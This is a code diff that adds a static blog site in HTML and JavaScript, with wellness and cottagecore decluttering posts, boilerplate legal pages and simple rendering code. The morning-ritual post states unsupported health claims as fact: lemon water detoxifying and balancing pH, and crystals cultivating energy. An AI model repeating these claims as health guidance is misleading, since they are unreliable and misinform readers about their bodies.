+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Slow, mindful mornings help lower cortisol levels and support nervous system balance.</li>
+    <li>Drinking fresh lemon water in the morning gently cleanses the body and aids digestion.</li>
+    <li>Setting daily intentions with crystals helps focus your mind and cultivate positive energy.</li>
+    <li>Greeting the sunrise and walking in nature physically connects you to natural biological rhythms.</li>
+    <li>Journaling and drinking green smoothies provide high-quality nourishment for your mind and body.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Steps 1 & 2: Internal Cleansing and Spiritual Alignment</h2>
+<p>Your morning journey begins with a gentle internal cleanse. Drinking a glass of warm lemon water is a wonderful, simple way to wake up your body. This easy habit helps flush out toxins, stimulates your digestion, and hydrates your cells after a long night of sleep. Packed with vitamin C, lemon water also gives your immune system a bright boost and balances your pH levels, leaving you feeling light, refreshed, and ready for a beautiful day.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Hold a piece of raw crystal, like calming amethyst or loving rose quartz, during your intention-setting practice. Take a moment to focus on the crystal's texture, take three deep breaths, and picture yourself moving through your day with absolute peace and confidence.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 2: Crystal Intention Setting</h3>
+<p>Once you are hydrated, take a few quiet minutes to focus your mind. Crystal intention setting is a lovely, comforting practice that helps you focus on what you want to invite into your life. Whether placing crystals on your altar or holding them in your hands, take a moment to visualize your goals, breathe in peace, and let go of any tension. This simple practice helps you start your day with a clear, calm, and positive focus.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Steps 3 & 4: Embracing Nature and Breathwork</h2>
+<p>Step 3 invites you to step outside and greet the golden hour. Watching the beautiful sunrise allows natural morning light to reach your eyes, which helps regulate your biological clock. This natural exposure supports healthy cortisol levels, boosts your daytime energy, and helps you sleep much better at night. Standing in the warm morning light is a wonderful reminder of the simple beauty of each new day.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;font-size:1.05rem;line-height:1.7;">Taking a morning walk in nature is a beautiful way to practice shinrin-yoku, or forest bathing. Walking among the trees and breathing in fresh air helps reduce stress, lowers your heart rate, and boosts your mood. Combining this walk with gentle breathwork fills your body with fresh oxygen and connects you deeply to the peaceful rhythms of the natural world.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 4: Forest Breathwork Walk</h3>
+<p>As you walk along the path, practice slow, deep breathing. Inhale the clean scent of pine and wild flowers, hold your breath for a moment, and exhale completely, letting go of any stress. This grounding walking meditation helps you connect with the earth beneath your feet, bringing a beautiful sense of peace and clarity to your mind.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Steps 5 & 6: Expressing Gratitude and Nourishing the Body</h2>
+<p>After connecting with nature, head back to your cozy space for Step 5: gratitude journaling. Write down the sweet, simple things you are grateful for: the warm morning light, the sound of birds, or the aroma of fresh coffee. Focusing on gratitude shifts your attention from what is missing to the abundance already in your life, filling your heart with happiness and contentment.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Gratitude journaling is most powerful when you focus on the details. Instead of writing a generic list, describe the exact warmth of a loved one's smile or the comforting weight of your favorite mug, allowing yourself to truly feel that appreciation in your heart.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Step 6: The Goddess Green Smoothie</h3>
+<p>Complete your morning ritual with Step 6: a delicious, nutrient-packed Goddess Green Smoothie. Blend fresh spinach, kale, kiwi, avocado, mango, and coconut water into a vibrant, delicious drink. This vitamin-rich smoothie gives your body a wonderful boost of fiber, antioxidants, and clean energy, nourishing you from the inside out and helping you shine all day long.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Step 1:</strong> Rehydrate with warm lemon water to boost your digestion.</li>
+    <li><strong>Step 2:</strong> Set positive daily intentions with the help of crystals.</li>
+    <li><strong>Step 3:</strong> step outside to welcome the morning golden hour.</li>
+    <li><strong>Step 4:</strong> enjoy a grounding, mindful breathwork walk in nature.</li>
+    <li><strong>Step 5:</strong> write down your thoughts in a daily gratitude journal.</li>
+    <li><strong>Step 6:</strong> enjoy a healthy, fresh green smoothie to fuel your day.</li>
+  </ul>
+</div>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Morning Ritual</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Goddess Life</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Mindful Habits</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Green Smoothie</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Self Love</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Holistic Health</span>
+</div>`
+            },
+            {
+                id: 'the-fourth-post',
+                title: 'The Ultimate Cottagecore Guide to Decluttering and Organizing Your Home',
+                date: 'March 18, 2026',
+                image: './assets/the-ultimate-cottagecore-guide-to-decluttering-and-organizing-your-home.png',
+                excerpt: 'Ready to turn your home into a peaceful, cozy sanctuary? Explore our cottagecore guide to organizing! Learn how to declutter using the Keep, Toss, Donate method, and discover beautiful, natural storage ideas like wicker baskets, wooden trays, and tags to keep your space cozy, tidy, and neat. 🏡\n\n* Use beautiful wooden trays to group similar items and keep drawers organized.\n* Categorize items with Keep, Toss, and Donate tags to simplify sorting.\n\nSave for later! #HomeOrganization #DeclutteringGuide #CottagecoreStyle #OrganizedSpace #SimpleLiving',
+                content: `<p>A beautifully organized home is a quiet sanctuary for your mind and soul. In a busy world, our living spaces can easily gather clutter, leaving us feeling stressed and overwhelmed. Embracing a slow, gentle cottagecore approach to organizing means treating your home with kindness, using natural materials, and creating simple systems that bring comfort to your daily life. By organizing your space with natural wooden trays, cozy wicker baskets, and pretty handmade labels, you can turn decluttering into a peaceful, mindful practice that brings deep comfort to your home.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Cottagecore organizing focuses on slow, intentional living and using beautiful natural materials.</li>
+    <li>The Keep, Toss, and Donate sorting system helps make decluttering simple and stress-free.</li>
+    <li>Wicker baskets and wooden organizers turn storage into a beautiful part of your home decor.</li>
+    <li>Sorting everyday items like mail, towels, and toiletries keeps small clutter from building up.</li>
+    <li>Simple, consistent daily habits make it easy to maintain a peaceful, organized sanctuary.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Gentle Cottagecore Approach to a Soothing Home</h2>
+<p>The cottagecore approach to organization is all about slow, warm, and intentional living. Instead of aiming for cold, minimalist perfection, it embraces a soft and cozy environment filled with warmth, character, and natural beauty. It is about choosing storage solutions that are both functional and lovely to look at, such as handmade baskets, glass jars, and wooden dividers. Organizing with love and gratitude allows you to appreciate your space, creating a soothing sanctuary where you can truly relax.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Use pretty, hand-written tags to label your storage boxes. Seeing charming labels like "Keep," "Toss," and "Donate" on your boxes makes organizing feel like a creative, cozy craft project.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Keep, Toss, and Donate Sorting Method</h3>
+<p>Before organizing, take some time to declutter using the gentle Keep, Toss, and Donate method. Work on one small area at a time, like a single drawer or shelf. Pick up each item and decide which category it belongs to. Put usable items you no longer need into a donation basket, recycle or toss anything that is broken, and organize the items you love back into their proper homes. This simple system makes sorting easy and stress-free.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Beautiful Storage: Wooden Trays, Wicker Baskets, and Glass Jars</h2>
+<p>Once you have decluttered, it is time to choose your storage. Natural wooden trays and dividers are perfect for keeping drawers tidy and grouping similar items together. Wicker baskets are wonderful for storing blankets, towels, and larger household essentials. Using natural, textured materials instead of plastic storage boxes adds a warm, rustic touch to your shelves, making organization feel like a cozy, natural part of your home decor.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;font-size:1.05rem;line-height:1.7;">Storing your items in beautiful, natural containers changes the way you feel about tidying up. When your storage is lovely and inviting, putting things away becomes a comforting, creative task. Organizing your space with care transforms housekeeping from a chore into a peaceful practice of self-care and gratitude for your home.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tackling Daily Clutter</h3>
+<p>Small everyday items, like letters, keys, and cosmetics, can quickly create clutter. Keep a designated wooden tray near your front door to hold incoming mail and keys. Use small glass jars on your vanity to keep cotton pads, makeup brushes, and small toiletries organized. Creating designated homes for these small items prevents visual clutter and helps your daily routines run smoothly and easily.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Simple Daily Habits to Maintain Your Soothing Sanctuary</h2>
+<p>Maintaining an organized home is easy when you build simple, daily habits. Spend five minutes tidying up your main living areas each evening before bed. Make sure to open your mail daily and sort it immediately into "action" or "recycle" piles. Encourage everyone in your household to return items to their proper homes after using them. These simple, mindful daily habits make it easy to enjoy a beautiful, organized, and peaceful cottagecore home.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Keep your home-organizing process slow and gentle. You do not need to organize your entire house in a single weekend. Focus on one shelf or drawer at a time, celebrate your progress, and enjoy the cozy journey of creating a peaceful home.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Comfort of a Restored Home</h3>
+<p>As you finish organizing your space, take a moment to look around and enjoy the peaceful atmosphere. Settle into a cozy chair with a warm cup of tea, and breathe in the calm, comfortable feeling of your tidy space. By organizing your home with love and care, you create a beautiful, nourishing sanctuary that supports you and your loved ones every single day.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Declutter:</strong> use the simple Keep, Toss, and Donate sorting method.</li>
+    <li><strong>Materials:</strong> use natural wicker baskets and wooden organizers.</li>
+    <li><strong>Systems:</strong> set up designated trays for mail, keys, and cosmetics.</li>
+    <li><strong>Upkeep:</strong> spend five minutes tidying up each evening to maintain order.</li>
+  </ul>
+</div>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Declutter</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Home Organization</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cottagecore Home</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Simple Living</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Clean Space</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cozy Storage</span>
+</div>`
+            },
+        ];
+
+        // Static Legal Pages (Required for AdSense & Pinterest)
+        const pages = {
+            'about': {
+                title: 'About Us',
+                content: `
+                    <p>Welcome to <strong>Organized Ambition</strong>!</p>
+                    <p>Our mission is to create a positive, inspiring, and safe space on the internet where we share thoughts, stories, and ideas about web development, creative hobbies, and daily life.</p>
+                    <p>Whether you are here to learn how to code, find creative inspiration, or just read some fun stories, we are glad you stopped by. We strive to provide high-quality, family-friendly content that sparks creativity and learning.</p>
+                    <p>Thank you for being part of our community!</p>
+                `
+            },
+            'privacy': {
+                title: 'Privacy Policy',
+                content: `
+                    <p><strong>Last updated: May 2026</strong></p>
+                    <p>At Organized Ambition, one of our main priorities is the privacy of our visitors. This Privacy Policy document contains types of information that is collected and recorded by us and how we use it.</p>
+                    
+                    <h3>Log Files</h3>
+                    <p>We follow a standard procedure of using log files. The information collected includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date and time stamp, referring/exit pages, and possibly the number of clicks. These are not linked to any information that is personally identifiable. The purpose of the information is for analyzing trends and administering the site.</p>
+                    <h3>Cookies and Web Beacons</h3>
+                    <p>Like any other website, we use "cookies". These cookies are used to store information including visitors' preferences, and the pages on the website that the visitor accessed or visited. The information is used to optimize the users' experience by customizing our web page content based on visitors' browser type and/or other information.</p>
+                    <h3>Google AdSense & Third-Party Privacy Policies</h3>
+                    <p>Third-party ad servers or ad networks use technologies like cookies, JavaScript, or Web Beacons that are used in their respective advertisements and links that appear on our blog. They automatically receive your IP address when this occurs.</p>
+                    <ul>
+                        <li>Third-party vendors, including Google, use cookies to serve ads based on a user's prior visits to your website or other websites.</li>
+                        <li>Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to your sites and/or other sites on the Internet.</li>
+                        <li>Users may opt out of personalized advertising by visiting Google's <a href="https://www.google.com/settings/ads" target="_blank" rel="noopener noreferrer">Ads Settings</a>. Alternatively, you can opt out of a third-party vendor's use of cookies for personalized advertising by visiting <a href="https://www.aboutads.info/choices/" target="_blank" rel="noopener noreferrer">www.aboutads.info</a>.</li>
+                    </ul>
+                    <h3>Pinterest and Social Media</h3>
+                    <p>We may use social media features, such as the Pinterest "Save" button or Pinterest analytics tags, which may collect your IP address and which page you are visiting on our site, and may set a cookie to enable the feature to function properly. Your interactions with these features are governed by the privacy policy of the company providing it (e.g., the <a href="https://policy.pinterest.com/en/privacy-policy" target="_blank" rel="noopener noreferrer">Pinterest Privacy Policy</a>).</p>
+                    <h3>Children's Information</h3>
+                    <p>Another part of our priority is adding protection for children while using the internet. We encourage parents and guardians to observe, participate in, and/or monitor and guide their online activity. We do not knowingly collect any Personal Identifiable Information from children under the age of 13. If you think that your child provided this kind of information on our website, we strongly encourage you to contact us immediately and we will do our best efforts to promptly remove such information from our records.</p>
+                `
+            },
+            'terms': {
+                title: 'Terms of Service',
+                content: `
+                    <p><strong>Effective Date: May 2026</strong></p>
+                    <h3>1. Acceptance of Terms</h3>
+                    <p>By accessing and using this website, you accept and agree to be bound by the terms and provision of this agreement.</p>
+                    
+                    <h3>2. User Conduct</h3>
+                    <p>Our blog is a family-friendly space. You agree to use the site only for lawful purposes. You agree not to take any action that might compromise the security of the site, render the site inaccessible to others, or otherwise cause damage to the site or the content.</p>
+                    <h3>3. Intellectual Property</h3>
+                    <p>The content, organization, graphics, design, and other matters related to the Site are protected under applicable copyrights and proprietary rights. The copying or redistribution by you of any such matters is strictly prohibited without our express written permission.</p>
+                    <h3>4. Disclaimer of Warranties</h3>
+                    <p>The materials on our website are provided on an 'as is' basis. We make no warranties, expressed or implied, regarding the accuracy, likely results, or reliability of the use of the materials on its website.</p>
+                    
+                    <h3>5. Links to Other Websites</h3>
+                    <p>Our website may contain links to third-party web sites or services (such as advertisers or social media platforms like Pinterest) that are not owned or controlled by us. We have no control over, and assume no responsibility for, the content or privacy policies of any third party web sites.</p>
+                `
+            },
+            'contact': {
+                title: 'Contact Us',
+                content: `
+                    <p>We would love to hear from you! Whether you have a question about our content, need assistance with our website, or want to inquire about our Privacy Policy and Terms of Service, feel free to reach out.</p>
+                    <p><strong>Email:</strong> <a href="mailto:contact@carolynadamsulo-creator.github.io">contact@carolynadamsulo-creator.github.io</a></p>
+                    <p>Please note that we aim to respond to all inquiries within 48 to 72 hours. We kindly ask that all communications remain respectful and appropriate.</p>
+                `
+            }
+        };
+
+        // 2. Application Logic
+        const app = document.getElementById('app');
+        const blogUsername = "Organized Ambition";
+        const avatarUrl = "./assets/blog-avatar.jpg"; // A placeholder avatar
+
+        // Function to render the home page (list of posts)
+        function renderHome() {
+            let html = '';
+            posts.forEach(post => {
+                html += `
+                    <div class="post-card" onclick="navigate('post', '${post.id}')">
+                        <div class="post-header">
+                            <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                            <span class="username">${blogUsername}</span>
+                        </div>
+                        <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                        <div class="post-content">
+                            <h2>${post.title}</h2>
+                            <p>${post.excerpt}</p>
+                        </div>
+                        <div class="post-footer">
+                            <span>${post.date}</span>
+                            <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                        </div>
+                    </div>
+                `;
+            });
+            app.innerHTML = html;
+        }
+
+        // Function to render a static page (like Privacy Policy)
+        function renderPage(pageId) {
+            const page = pages[pageId];
+            if (!page) {
+                app.innerHTML = `<p style="color: #3d3430;">Page not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-content" style="padding-top: 30px; padding-bottom: 30px;">
+                        <h1>${page.title}</h1>
+                        ${page.content}
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Function to render a single post
+        function renderPost(postId) {
+            const post = posts.find(p => p.id === postId);
+            if (!post) {
+                app.innerHTML = `<p style="color: #3d3430;">Post not found.</p><a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>`;
+                return;
+            }
+            app.innerHTML = `
+                <a class="back-button" onclick="navigate('home')">&larr; Back to Dashboard</a>
+                <div class="single-post">
+                    <div class="post-header">
+                        <img class="avatar" src="${avatarUrl}" alt="Avatar">
+                        <span class="username">${blogUsername}</span>
+                    </div>
+                    <img class="post-image" src="${post.image}" alt="${post.title}" onerror="this.onerror=null; this.src='https://via.placeholder.com/540x400?text=Image+Not+Found'">
+                    <div class="post-content">
+                        <h1>${post.title}</h1>
+                        ${post.content}
+                    </div>
+                    <div class="post-footer">
+                        <span>${post.date}</span>
+                        <span style="letter-spacing: 10px; font-size: 1.1rem;">↻ ♥</span>
+                    </div>
+                </div>
+            `;
+            window.scrollTo(0, 0); // Scroll to top
+        }
+
+        // Simple router/navigator
+        function navigate(view, id = null) {
+            if (view === 'home') {
+                window.location.hash = '';
+                renderHome();
+            } else if (view === 'post') {
+                window.location.hash = id;
+                renderPost(id);
+            } else if (view === 'page') {
+                window.location.hash = id;
+                renderPage(id);
+            }
+        }
+
+        // Listen for browser back/forward buttons
+        window.addEventListener('hashchange', () => {
+            const hash = window.location.hash.replace('#', '');
+            if (hash) {
+                // Check if the hash matches a static page, otherwise assume it's a post
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+</html>
